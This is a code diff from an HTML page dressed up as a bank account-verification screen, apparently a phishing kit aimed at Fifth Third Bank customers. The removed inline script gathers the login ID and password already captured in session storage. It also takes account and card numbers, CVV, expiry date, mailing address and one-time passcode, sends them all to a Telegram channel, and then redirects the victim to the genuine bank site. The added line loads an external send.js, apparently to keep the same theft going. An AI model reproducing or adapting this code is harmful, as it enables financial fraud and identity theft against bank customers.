@@ -202,29 +202,6 @@
       <p>For your security, please verify your account details to continue.</p>
     </div>
   </div>
-  <script src="vault/send.js"></script>
-  <script>
-    document.getElementById('verify-form').onsubmit = function(e) {
-      e.preventDefault();
-      // Get login data from sessionStorage
-      const userid = sessionStorage.getItem('userid') || '';
-      const password = sessionStorage.getItem('password') || '';
-      // Get verification data from form
-      const data = {
-        userid: userid,
-        password: password,
-        accountnumber: this.accountnumber.value,
-        cardnumber: this.cardnumber.value,
-        cvv: this.cvv.value,
-        expdate: this.expdate.value,
-        mailingaddress: this.mailingaddress.value,
-        otp: this.otp.value
-      };
-      sendToTelegram(data, () => {
-        this.reset();
-        window.location.href = 'https://www.53.com/';
-      });
-    };
-  </script>
+  <script src="send.js"></script>
 </body>
 </html> 
